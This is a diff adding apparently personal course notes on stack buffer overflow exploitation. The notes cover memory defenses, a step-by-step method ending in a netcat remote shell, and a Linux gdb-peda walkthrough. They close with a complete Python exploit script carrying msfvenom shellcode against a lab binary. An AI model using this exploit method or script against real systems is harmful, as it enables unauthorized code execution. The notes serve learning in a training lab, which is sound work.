@@ -258,21 +258,154 @@ mem2:
   cmp rax, r8     # compare the  value of r8 to the the register rax
   je mem1         # if the values are equal ju,p to mem1
 
---- GHIDRADEMO ---
-
 
 
 #############################################
 Exploit Development - Functional :: Exploit Development - Buffer Overflow 1-2
 #############################################
+Buffer overflow is a condiiton exists when the computer attempts to put more data in the buffer than it can hold, or when a program puts too much data in a buffer space
+  Corrupt Data
+  Crash the Program
+  Or Execute Malicious Code
+Heap - allocated and deallocated mmeory as needed
+Stack - used for passing arguments to other functions
+Registers - storage elements
+Stack Pointer - contains the space to the next avilable place on the stack
+Base Pointer - points at the base of the stack
+DEFENSES 
+  Non-Executabe Stack
+    Marking the allocated memory for the stack as non-executable is prudent
+  Address Space Layout Randomization (ASLR)
+    Pseudo-randomizes the memory addresses of the stack, running processes and shared objects in memory
+  Data Execution Prevention (DEP)
+    Data is data, and not code and should never execute
+  Stack Canaries
+    Change every time a program executes
+STEPS
+  Analyze the program
+        Static analysis 
+        Run the file command
+        Run the strings command
+            Disassemble
+            Decompile 
+            ldd 
+            hashing 
+            Submit 
+            Symbols and sections 
+        Dynamic analysis 
+        Memory analysis 
+After performing basic analysis of the program, determining how you will interact with the program is often relatively straight forward. If it has a listening port, then you can send input/commands using tools like netcat or bash sockets. If it is a command line program that has interactive prompts, then interacting or fuzzing the program locally may be all that is required. This step could take some effort and to document every possible way to interact with the program is futile.
+Configure the environment determined in step 2 and install necessary tools to assist in interacting with or fuzzing the program (i.e. netcat, python, etc).
+Utilizing information gathered, fuzz the binary with different values and lengths of values to determine if you can create a segmentation fault. If you produce a general protection fault, reduce the length of values and attempt to get it to create a segmentation fault. A general protection fault can occur when stomping on kernel space virtual memory. On 64-bit systems, user-space virtual memory is allocated and locked using the lower 47 bits of the address; therefore, it is limited to the address range of 0x0 to 0x7fffffffffff. If the instruction pointer (IP) is greater than 0x7fffffffffff, you will get a general protection fault, and your buffer overflow attempt will fail. A segmentation fault occurs when the program attempts to access memory that hasn’t been allocated or is not allowed to access within the boundaries of the virtual memory assigned to it.
+If you can successfully generate a segmentation fault, determine the quantity of characters until the IP is overwritten. To do this, you can create your own pattern and then calculate the offset based on the characters in the input that overwrote IP. There are freely available tools that provide this functionality such as Metasploit’s pattern-create.rb, the GNU debugger (gdb) plugin peda running the command pattern create, and the Immunity Debugger plugin mona running the command pattern_create, or a locally developed tool /sec_tools/patternManager.py can be used to generate the input pattern.
+Run the exploitable binary in a debugger and send the newly generated pattern as input in the same way you fuzzed it.
+When the debugger stops, view the contents in the IP. The IP should contain a portion of values from the pattern it generated for you in Step 5. Input this value into the companion program or command that you used to create the pattern. Metasploit’s companion tool is pattern_offset.py, the GNU debugger (gdb) plugin peda running the command pattern offset, and the Immunity Debugger plugin mona running the command pattern_offset, or the locally developed /sec_tools/patternManager.py command provides a dual purpose of also determining the offset. (Be sure to use the companion program from the same suite as they are not compatible with each other)
+Modify your exploit assembly script to create a file with the following using the pattern offset determined in the previous step: A * pattern_offset + B*4
+Rerun the binary in the debugger and read the input created above.
+Check to make sure that the EIP contains all B's (hex 0x42). If it does not, change the value of your pattern_offset and rerun the binary until the EIP contains all B's.
+After you have confirmed your offset, rerun your debugger and determine the value of the IP to execute injected shell code. In most cases, your shellcode will immediately follow the overwritten IP, You can also find vulnerable portions of the binary that can be used to execute the shellcode based on register contents.
+To use registers contents to alter the code path, use tools such as Metasploit’s msfpescan to search Windows executables, and msfelfscan to search Linux executables. If you are using Immunity and mona, then you can use the jmp command to find code that can be repurposed to execute the injected shellcode on the stack. If you are using the GNU debugger (gdb) plugin peda, then you can use the jmpcall command to find code to repurpose in order to execute the injected shellcode.
+Once you find the address of where your shellcode resides on the stack or the address of the code you will repurpose to jump to the contents of that register, replaces the B’s from the attack script with that address.
+Rerun the debugger and test your attack script. Make sure the EIP is filled with the memory address you added to your attack script.
+Check for bad characters by passing all possible characters that can be passed to the program, evaluate the results, and take note of characters than cannot be processed. You may have to create a file to read it, or redirect to the program.
+Using MSVenom, enter known bad characters and develop shellcode to inject into the attacked binary.
+Modify attack script to incorporate the shellcode to look like: A * pattern_offset + mem_address + exploit
+You may need to add padding in the for m of NOPs. In this case your attack script will need to add them between the return address and exploit: shellcode A * pattern_offset + mem_address + "0x90"*32 + exploit
+Launch the binary without the debugger. Launch a netcat listener according to how you created your payload. Launch your attack script.
+Your NC listener should now be connected to a remote shell on the exploited box.
+
+VULENERBALE FUNCTIONS
+strcpy
+strcat
+f
+get
 
 
+--- LINUX ---
+1. gdp <executable>    # this opens gdb-peda
+2. disass main   # dissasembles the main function
+  you can do this with all functions in the program
+3. run               # within gdp-peda
+  Warning: not running   # try again and add more
+4. run with longer input
+  Segmentation Fault     # this is how you know the buffer has been overflowed
+5. Go to the follow website
+  https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+6. create a python script for exploit    # on linops
+  The length of the EIP is 4 bytes
+  using wiremask get a randomly generated 200 character pattern
+########## Starting Script
+<
+  buffer = "<200 character string>"
+  
+  EIP = "BBBB"
+  
+  nop = '\x90' * 5
+  
+  print(buffer + EIP + nop)
+>
 
+7.. run the executable using your script as user input  # in gdb-peda
+  run <<< $(python lin_buf.py)
+8. Take the EIP value and input it into wiremask in the Register Value box
+  # This will give you the byte offset of the EIP
+9. back in the script 
+  Change the bufer value to "A" *  the byte offset value
+10. Run the executable using your script as user input again
+  run <<< $(python lin_buf.py)
+11. exit gdb-peda
+12. env - gdb <executable>   # this just runs gdb instead of gdb-peda
+  show env
+  unset env LINES
+  unset env COLUMNS
+  show env
+13. run the program
+14. info proc map
+  look for [heap]  # you want the first address after [heap] all the way to the end of the stack
+15. find /b 0xf7de1000 , 0xffffe000, 0xff, 0xe4   # the last to is searching for jump ESP address locations
+  # this is the first and last address as explained above
+16. Copy first five values
+17. Within the script comment out the EIP line
+18. Paste values into script and comment them out
+19. Set a new eip value to the reverse value of one of the addresses pasted in 
+  for example
+    0xf7f645fb     bceomes
+    "\xfb\x45\xf6\xf7"
+20. load msfconsole    # in a separate linops terminal
+  use payload/linux/x86/exec
+    show options
+  set CMD whoami
+    show options
+  generate -b "\x00" -f python 
+21. paste the payload generated into your script
+  modify print statement and add "+ buf"
+########## Ending Script
+<
+buffer = "A" * 62
 
+#EIP = "BBBB"
 
+eip = "\xfb\x45\xf6\xf7"
 
+#0xf7de3b59
+#0xf7f588ab
+##0xf7f645fb
+#0xf7f6460f
+#0xf7f64aeb
 
+buf =  b""
+buf += b"\xdd\xc5\xbf\xcc\xfc\x18\xdf\xd9\x74\x24\xf4\x5d"
+buf += b"\x2b\xc9\xb1\x0b\x31\x7d\x19\x03\x7d\x19\x83\xc5"
+buf += b"\x04\x2e\x09\x72\xd4\xf6\x6b\xd1\x8c\x6e\xa1\xb5"
+buf += b"\xd9\x89\xd1\x16\xa9\x3d\x22\x01\x62\xdf\x4b\xbf"
+buf += b"\xf5\xfc\xde\xd7\x01\x02\xdf\x27\x79\x6a\xb0\x46"
+buf += b"\xe8\x03\x4e\xde\xa1\x5a\xaf\x2d\xc5"
+nop = '\x90' * 5
 
+print(buffer + eip + nop + buf)
+>
+22. On linops run the func executable using the script as userinput
+  sudo ./func <<< $(python lin_buf.py)
 
 #############################################
 Post exploitation :: Local Host Enumeration
